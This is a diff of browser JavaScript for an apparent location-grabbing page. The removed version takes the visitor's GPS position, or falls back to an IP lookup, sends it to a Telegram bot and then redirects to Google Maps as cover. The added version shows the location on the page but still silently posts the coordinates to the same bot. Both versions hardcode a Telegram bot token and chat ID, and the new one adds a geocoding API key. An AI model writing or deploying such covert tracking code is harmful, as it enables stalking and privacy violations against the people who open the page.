@@ -1,95 +1,58 @@
+const locationDisplay = document.getElementById("location");
 const loadingOverlay = document.getElementById("loading");
+const retryBtn = document.getElementById("retry-btn");
 
-function logAndRedirect(data) {
-  console.log("📍 Location Data:", data);
-
-  const TELEGRAM_BOT_TOKEN = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
-  const TELEGRAM_CHAT_ID = "6602027873";
-
-  const message = `
-📡 *New Location Captured*
-Source: ${data.source}
-Latitude: ${data.lat}
-Longitude: ${data.lon}
-${data.city ? `City: ${data.city}` : ""}
-${data.region ? `Region: ${data.region}` : ""}
-${data.country ? `Country: ${data.country}` : ""}
-Accuracy: ${data.accuracy || "N/A"}
-Map: https://www.google.com/maps?q=${data.lat},${data.lon}
-  `;
-
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  })
-  .then(() => {
-    setTimeout(() => {
-      window.location.href = "https://www.google.com/maps";
-    }, 1500);
-  })
-  .catch((err) => {
-    console.error("❌ Telegram log failed:", err);
-    setTimeout(() => {
-      window.location.href = "https://www.google.com/maps";
-    }, 1500);
+function getLocation() {
+  navigator.geolocation.getCurrentPosition(success, error, {
+    enableHighAccuracy: true,
+    timeout: 10000,
+    maximumAge: 0
   });
 }
 
-function requestLocation() {
-  if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const coords = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          source: "GPS"
-        };
-        logAndRedirect(coords);
-      },
-      (err) => {
-        console.warn("⚠️ GPS Denied:", err.message);
-        fallbackToIP();
-      },
-      { enableHighAccuracy: true, timeout: 10000 }
-    );
-  } else {
-    fallbackToIP();
-  }
-}
+function success(pos) {
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
 
-function fallbackToIP() {
-  fetch("https://ip-api.com/json")
+  fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=8e640acb36a3409a9877e0c900653f7d`)
     .then(res => res.json())
     .then(data => {
-      const coords = {
-        lat: data.lat,
-        lon: data.lon,
-        city: data.city,
-        region: data.regionName,
-        country: data.country,
-        source: "IP"
-      };
-      logAndRedirect(coords);
+      const c = data.results[0].components;
+      const locationString = `${c.country}, ${c.state}, ${c.county || c.district}, ${c.village || c.suburb || c.town || c.city || ''}`;
+      locationDisplay.textContent = locationString;
+      loadingOverlay.style.display = "none";
+
+      // 🔹 Send to Telegram
+      const message = `📍 New Location:\n${locationString}\nLatitude: ${lat}\nLongitude: ${lon}`;
+      fetch(`https://api.telegram.org/bot7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "6602027873",
+          text: message
+        })
+      });
+
     })
-    .catch(err => {
-      console.error("IP location failed", err);
-      logAndRedirect({ source: "Unknown" });
+    .catch(() => {
+      locationDisplay.textContent = "Location lookup failed.";
+      loadingOverlay.style.display = "none";
     });
 }
 
-function retryGPS() {
-  requestLocation();
+function error(err) {
+  locationDisplay.textContent = "GPS denied. Cannot get exact location.";
+  loadingOverlay.style.display = "none";
 }
 
+retryBtn.addEventListener("click", () => {
+  loadingOverlay.style.display = "flex";
+  locationDisplay.textContent = "Retrying...";
+  getLocation();
+});
+
 window.onload = () => {
-  setTimeout(() => {
-    loadingOverlay.style.display = "none";
-    requestLocation();
-  }, 1500);
+  getLocation();
 };
